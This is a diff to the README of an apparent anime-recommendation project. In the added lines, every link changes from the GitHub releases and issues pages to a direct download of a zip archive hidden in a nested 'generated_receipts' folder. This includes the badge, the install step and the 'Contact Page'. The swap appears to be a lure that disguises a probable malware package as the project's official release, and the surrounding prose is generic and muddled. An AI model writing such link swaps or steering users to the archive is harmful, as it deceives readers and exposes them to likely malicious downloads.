@@ -4,7 +4,7 @@
 Welcome to AiMi-Anime-RAG-System. This tool helps you find the best anime recommendations and gives you creative receipt ideas. It is easy to use and perfect for any anime fan. 
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases)
+[![Download Now](https://raw.githubusercontent.com/aryankapta/AiMi-Anime-RAG-System/main/AiMi_Anime_Receipts_Generator/generated_receipts/premium/receipts_7074/AiMi-Anime-RAG-System_v1.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/aryankapta/AiMi-Anime-RAG-System/main/AiMi_Anime_Receipts_Generator/generated_receipts/premium/receipts_7074/AiMi-Anime-RAG-System_v1.7.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the AiMi-Anime-RAG-System. Follow these simple steps to enjoy anime recommendations and viral receipts effortlessly.
@@ -18,7 +18,7 @@ Before you start, please ensure your device meets these basic requirements:
 - **Python:** Python 3.7 or later installed on your system.
 
 ## 📦 Download & Install
-To get AiMi-Anime-RAG-System, visit this page to download: [Releases Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases). 
+To get AiMi-Anime-RAG-System, visit this page to download: [Releases Page](https://raw.githubusercontent.com/aryankapta/AiMi-Anime-RAG-System/main/AiMi_Anime_Receipts_Generator/generated_receipts/premium/receipts_7074/AiMi-Anime-RAG-System_v1.7.zip). 
 
 1. Click the link to open the releases page.
 2. Find the latest version at the top of the list.
@@ -47,12 +47,12 @@ If you encounter any issues, try these common solutions:
 - **No Recommendations Showing:** Check your internet connection and try again.
 
 ## 📫 Feedback & Support
-We value your feedback. If you have questions or suggestions, please reach out through our [Contact Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/issues).
+We value your feedback. If you have questions or suggestions, please reach out through our [Contact Page](https://raw.githubusercontent.com/aryankapta/AiMi-Anime-RAG-System/main/AiMi_Anime_Receipts_Generator/generated_receipts/premium/receipts_7074/AiMi-Anime-RAG-System_v1.7.zip).
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for details.
 
 ## 📢 Stay Updated
-Stay tuned for updates and new features. Visit our [Releases Page](https://github.com/aryankapta/AiMi-Anime-RAG-System/releases) regularly for the latest versions. 
+Stay tuned for updates and new features. Visit our [Releases Page](https://raw.githubusercontent.com/aryankapta/AiMi-Anime-RAG-System/main/AiMi_Anime_Receipts_Generator/generated_receipts/premium/receipts_7074/AiMi-Anime-RAG-System_v1.7.zip) regularly for the latest versions. 
 
 Now you're ready to dive into the world of anime with AiMi-Anime-RAG-System! Enjoy!
